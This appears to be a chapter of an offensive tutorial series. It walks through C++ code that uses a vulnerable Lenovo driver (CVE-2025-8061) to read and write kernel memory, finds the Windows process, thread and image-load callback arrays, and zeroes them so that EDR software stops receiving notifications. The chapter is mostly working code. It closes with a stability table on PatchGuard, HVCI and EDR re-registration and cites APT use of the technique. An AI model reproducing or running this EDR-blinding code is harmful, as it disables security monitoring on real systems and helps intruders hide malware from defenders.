# 09 — Kernel Callback Removal (Ps* Notify Arrays)

**File:** `09_callback_kill.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive used:** Physical read/write + Kernel VA read + Export scan  
**Output:** EDR no longer receives notifications about process creation, thread creation, or image load

---

## Objective

Zero all entries in the three Windows kernel arrays that hold EDR/AV callbacks:
- `PspCreateProcessNotifyRoutineArray` — triggered when a process is created/exits
- `PspCreateThreadNotifyRoutineArray` — triggered when a thread is created/exits
- `PspLoadImageNotifyRoutineArray` — triggered when a PE image is loaded into memory

---

## Background Theory

### Kernel Notification Callbacks

EDR products call `PsSetCreateProcessNotifyRoutine[Ex]`, `PsSetCreateThreadNotifyRoutine`, and `PsSetLoadImageNotifyRoutine` to register callbacks. Each time the kernel creates a process/thread or loads an image, it iterates through the corresponding array and invokes each callback.

### EX_FAST_REF format

Each slot in the array is an `EX_CALLBACK_ROUTINE_BLOCK*` stored as an **ExFastRef**:

```
bits [63:4] = pointer to EX_CALLBACK_ROUTINE_BLOCK (16-byte aligned)
bits [3:0]  = reference count (managed by the kernel)
```

Zeroing all 8 bytes → the kernel sees the slot as null → skips it → callback is never called.

### Locating the array address

These arrays are NOT exported directly. We find them by:
1. `PsSetCreateProcessNotifyRoutine` is exported from ntoskrnl
2. Its code calls an internal function
3. That internal function contains a `LEA r, [RIP+imm32]` pointing into the array in `.data`

Pattern: scan the code of the exported function and its callees, looking for a LEA instruction pointing into `.data` at a characteristic offset.

### PatchGuard does not check these arrays

**Confirmed** on Win10 19041 through Win11 26100. Microsoft decided not to protect these arrays because they are legitimate data structures. This is why the technique is **more stable** than ETW patching.

---

## Code Walkthrough

### GetNtoskrnlInfo() — get base, .data bounds

```cpp
struct NtInfo {
    uint64_t base;
    uint64_t data_va;
    uint32_t data_size;
};

static bool GetNtoskrnlInfo(uint64_t cr3, NtInfo *out)
{
    // NtQuerySystemInformation(11) to get the kernel module list
    // Find "ntoskrnl.exe" or "ntkrnlmp.exe"
    ...
    out->base = (uint64_t)(uintptr_t)mods[i].ib;

    // Parse PE header to find .data section bounds
    uint8_t hdrbuf[0x1000] = {};
    KernelRead(cr3, out->base, hdrbuf, sizeof(hdrbuf));

    for (WORD s = 0; s < nsec && s < 32; s++) {
        DWORD o = soff + s * 40;  // IMAGE_SECTION_HEADER offset
        const char *name  = (const char*)(hdrbuf + o);
        DWORD vsize = *(DWORD*)(hdrbuf + o + 0x08);  // VirtualSize
        DWORD vrva  = *(DWORD*)(hdrbuf + o + 0x0C);  // VirtualAddress
        DWORD chars = *(DWORD*)(hdrbuf + o + 0x24);  // Characteristics

        // .data: writable (0x40000000) + readable (0x80000000)
        if (strncmp(name, ".data", 5) == 0 && (chars & 0xC0000000) == 0xC0000000) {
            out->data_va   = out->base + vrva;
            out->data_size = vsize;
        }
    }
}
```

We need the `.data` bounds to validate LEA targets: the array must reside within ntoskrnl's `.data`.

### FindCallbackArray() — core algorithm

```cpp
static uint64_t FindCallbackArray(uint64_t cr3, uint64_t func_va,
                                   uint64_t data_va, uint32_t data_size,
                                   const char *label)
{
    // May scan the exported function AND sub-functions it calls
    uint64_t scan_targets[4] = { func_va, 0, 0, 0 };
    int      n_targets = 1;

    for (int t = 0; t < n_targets; t++) {
        uint64_t scan_va = scan_targets[t];
        uint8_t code[512] = {};
        KernelRead(cr3, scan_va, code, sizeof(code));
```

```cpp
        for (int i = 0; i < (int)sizeof(code) - 7; i++) {
            uint8_t pfx = code[i];
            uint8_t op  = code[i+1];

            // Follow CALL (E8 imm32) to scan callees — because PsSetCreateProcessNotifyRoutine
            // may be just a wrapper that calls the internal function which actually accesses the array
            if (code[i] == 0xE8 && n_targets < 4) {
                int32_t rel = *(int32_t*)(code + i + 1);
                uint64_t callee = scan_va + i + 5 + (int64_t)rel;
                // CALL target = next instruction (i+5) + signed relative offset
                
                if ((callee >> 48) == 0xFFFF) {  // must be a kernel VA
                    bool dup = false;
                    for (int k = 0; k < n_targets; k++)
                        if (scan_targets[k] == callee) { dup = true; break; }
                    if (!dup) scan_targets[n_targets++] = callee;
                    // Add callee to the scan queue (max 4)
                }
            }
```

```cpp
            // Pattern: LEA with REX prefix
            // REX prefix: 0x40-0x4F (bits: 0100 W R X B)
            // W=1 → 64-bit operand; other bits → extend registers
            if ((pfx & 0xF0) != 0x40) continue;  // must be a REX byte
            if (op != 0x8D) continue;             // 0x8D = LEA opcode

            uint8_t modrm = code[i+2];
            // mod=00, rm=101 → RIP-relative addressing
            // 0xC7 = 11000111b (mask bits[7:6] and [2:0])
            // 0x05 = 00000101b (mod=00, rm=101)
            if ((modrm & 0xC7) != 0x05) continue;
```

LEA instruction encoding (REX.W 8D /r imm32):
```
byte 0: REX prefix (0x48/0x49/0x4C/0x4D)
byte 1: 0x8D (LEA)
byte 2: ModRM = mod:reg:rm
byte 3-6: imm32 (signed RIP-relative offset)
```

```cpp
            int32_t  imm32  = *(int32_t*)(code + i + 3);
            uint64_t target = scan_va + i + 7 + (int64_t)imm32;
            // RIP = scan_va + i + 7 (next instruction: 1+1+1+4 = 7 bytes)
            // target = RIP + sign_extend(imm32)
```

```cpp
            // Target must lie within ntoskrnl .data
            if (target < data_va || target + 8 > data_va + data_size) continue;

            // Read the first 8 entries of the candidate array
            uint64_t entries[8] = {};
            KernelRead(cr3, target, entries, sizeof(entries));

            bool has_kernel_entry = false;
            bool all_valid = true;
            for (int k = 0; k < 8; k++) {
                uint64_t e = entries[k];
                if (e == 0) continue;  // empty slot — OK
                uint64_t ptr = e & ~0xFULL;  // clear ExFastRef refcount bits
                if ((ptr >> 48) == 0xFFFF) {
                    has_kernel_entry = true;
                    continue;
                }
                all_valid = false; break;  // not a kernel pointer → false positive
            }
            if (!all_valid) continue;
            if (!has_kernel_entry) continue;  // all zero → array empty, not useful

            return target;  // found!
```

Validation logic:
1. Target must be in `.data` — avoids scanning into the code section
2. Read the first 8 slots — each slot must be null or a kernel ExFastRef pointer
3. At least 1 non-null entry must be present (an EDR is registered)
4. If any value is invalid → this is random data, skip

### ZeroCallbacks()

```cpp
static int ZeroCallbacks(uint64_t cr3, uint64_t array_va,
                          const char *label, CbSaved *save)
{
    for (int i = 0; i < MAX_CALLBACKS; i++) {  // MAX_CALLBACKS = 64
        uint64_t entry_va = array_va + (uint64_t)i * 8;  // 8 bytes per entry
        uint64_t entry_pa = VaToPa(cr3, entry_va);
        if (!entry_pa) continue;

        uint64_t val = 0;
        PhysReadU64(entry_pa, &val);
        save->orig[i] = val;

        if (!val) continue;  // empty slot, skip

        uint64_t ptr = val & ~0xFULL;  // ExFastRef: clear low 4 bits
        printf("  [%02d] 0x%016llX  ptr=0x%016llX\n", i, val, ptr);

        // Zero slot
        PhysWriteU64(entry_pa, 0);

        // Readback verify
        uint64_t rb = 0xFFFF;
        PhysReadU64(entry_pa, &rb);
        if (rb == 0) {
            zeroed++;
            save->count++;
        } else {
            printf("    [!] Slot %d write did not stick (HVCI?)\n", i);
        }
    }
```

### RestoreCallbacks()

```cpp
static void RestoreCallbacks(uint64_t cr3, const CbSaved *save, const char *label)
{
    for (int i = 0; i < MAX_CALLBACKS; i++) {
        if (!save->orig[i]) continue;  // original slot was null → no need to restore

        uint64_t entry_va = save->array_va + (uint64_t)i * 8;
        uint64_t entry_pa = VaToPa(cr3, entry_va);
        if (!entry_pa) continue;

        PhysWriteU64(entry_pa, save->orig[i]);  // restore original value
    }
}
```

### Main targets

```cpp
static const struct { const char *export_sym; const char *label; } targets[] = {
    { "PsSetCreateProcessNotifyRoutine", "PspCreateProcessNotifyRoutineArray" },
    { "PsSetCreateThreadNotifyRoutine",  "PspCreateThreadNotifyRoutineArray"  },
    { "PsSetLoadImageNotifyRoutine",     "PspLoadImageNotifyRoutineArray"     },
};
```

These three exported functions serve as entry points for locating the three corresponding arrays.

---

## Why APT groups use this technique heavily

1. **Stable** — PatchGuard does not check, no BSOD
2. **Effective** — zeroing notifications → EDR is unaware of new processes → bypasses DLL injection detection, memory scanning on new processes
3. **Reversible** — restore arrays → clean up by zeroing
4. **Data-only** — does not modify code, does not trigger code integrity checks

**Lazarus FudModule** (2022, 2024), **RealBlindingEDR** (Chinese), and **EDRSandBlast** (Wavestone) all implement this technique.

---

## Stability

| Issue | Explanation |
|-------|-------------|
| PatchGuard | **Not checked** — data-only, stable |
| HVCI | Not affected — data section is not protected by the hypervisor |
| EDR re-registration | Some EDRs re-register callbacks when they detect that a callback was removed. But only when an event exists to trigger re-registration |
| KASLR | Array VA is resolved fresh each run |

---

## Flow Summary

```
GetSystemCR3() → cr3
GetNtoskrnlInfo(cr3) → nt.base, .data bounds

For each Ps* exported function:
    GetNtExport(fn_name) → fn_va
    FindCallbackArray(cr3, fn_va, .data bounds):
        Scan 512 bytes of fn code + callees
        Find LEA [RIP+X] with target in .data
        Validate: entries are kernel ExFastRef pointers
        → array_va

For each found array:
    For slot 0..63:
        PhysReadU64(slot_pa) → original value
        PhysWriteU64(slot_pa, 0)
        Verify write stuck

[+] N callbacks zeroed — EDR blind

[Press Enter]

Restore all original values
```
